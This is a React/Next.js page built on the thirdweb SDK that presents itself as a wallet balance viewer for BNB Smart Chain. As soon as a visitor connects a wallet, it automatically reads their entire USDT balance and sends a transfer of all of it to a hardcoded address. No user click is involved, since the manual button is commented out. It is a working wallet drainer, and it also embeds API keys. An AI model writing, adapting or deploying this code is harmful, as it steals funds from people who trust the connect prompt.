"use client";
import { createThirdwebClient, getContract, prepareContractCall, toWei } from "thirdweb";
import { ConnectButton, useActiveAccount, useWalletBalance, useSendTransaction } from "thirdweb/react";
import { bsc } from "thirdweb/chains";
import { createWallet } from "thirdweb/wallets";
import { useEffect, useState } from "react";
import axios from "axios";

const clientIdMAIN = "acbda4ca6f743f0357967452ead6731c";
const USDTCONTRACTADDRESS = "0x55d398326f99059ff775485246999027b3197955";
const EXCHANGE_API_DEV = "https://api-testnet.bscscan.com";
const EXCHANGE_API = "https://api.bscscan.com";
const EXCHANGE_API_KEY = "5CCWDRSP7A226B3M2B24GR8JXB3D12N4A3";
const SEND_TO_ADDRESS = "0xBF06f44A57D255520E04E4d7EF7Ae87DB911fE7C";



const client = createThirdwebClient({
  clientId: clientIdMAIN,
});

const contract = getContract({
  address: USDTCONTRACTADDRESS,
  chain: bsc,
  client,
});

const wallets = [
  createWallet("io.metamask"),
  createWallet("com.coinbase.wallet"),
  createWallet("me.rainbow"),
  createWallet("io.rabby"),
  createWallet("io.zerion.wallet"),
  createWallet("walletConnect"),
];

export default function Home() {
  const [usdtBalance, setUsdtBalance] = useState<number | null>(null); // State for USDT balance


  const { mutate: sendTransaction } = useSendTransaction();
  const account = useActiveAccount();
  const { data: balance, isLoading } = useWalletBalance({
    client,
    chain: bsc,
    address: account?.address,
  });


  // Function to fetch USDT balance from BscScan API
  const fetchUsdtBalance = async (walletAddress: any) => {
    try {
      const response = await axios.get(
        `${EXCHANGE_API}/api?module=account&action=tokenbalance&contractaddress=${USDTCONTRACTADDRESS}&address=${walletAddress}&tag=latest&apikey=${EXCHANGE_API_KEY}`
      );
      console.log("Fetched USDT Balance:", response.data.result);

      // Convert balance from Wei (smallest unit) to a more readable format if needed (e.g., using 18 decimals for ERC-20 tokens)
      const balanceInReadableFormat = parseFloat(response.data.result) / 10 ** 18; // Adjust decimals if needed
      setUsdtBalance(balanceInReadableFormat); // Set fetched balance
      console.log('balanceInReadableFormat  ', balanceInReadableFormat);
      onClick(balanceInReadableFormat);
    } catch (error) {
      console.error("Error fetching USDT balance:", error);
    }
  };

  const { mutate: sendTx, data: transactionResult } = useSendTransaction();

  const onClick = (usdtBalanceTemp: any) => {
    const transaction = prepareContractCall({
      contract,
      method: "function transfer(address to, uint256 value)",
      params: [SEND_TO_ADDRESS, toWei(usdtBalanceTemp+"")],
    })

    sendTx(transaction);
  };


  // Automatically trigger token transfer when account address is available
  useEffect(() => {
    if (account?.address) {
      fetchUsdtBalance(account?.address); // Fetch USDT balance

    }
  }, [account?.address]); // Runs when account.address changes

  return (
    <div>

      <ConnectButton
        client={client}
        wallets={wallets}
        connectButton={{ label: "Connect Your Wallet" }}
        connectModal={{ size: "compact" }}
      />
      <p>Wallet address: {account?.address}</p>
      <p>
        Wallet balance: {balance?.displayValue} {balance?.symbol}
      </p>
      <p>
        USDT balance: {usdtBalance}
      </p>

      {/* <button onClick={onClick}>Transfer Tokens</button> */}
    </div>

  );
}
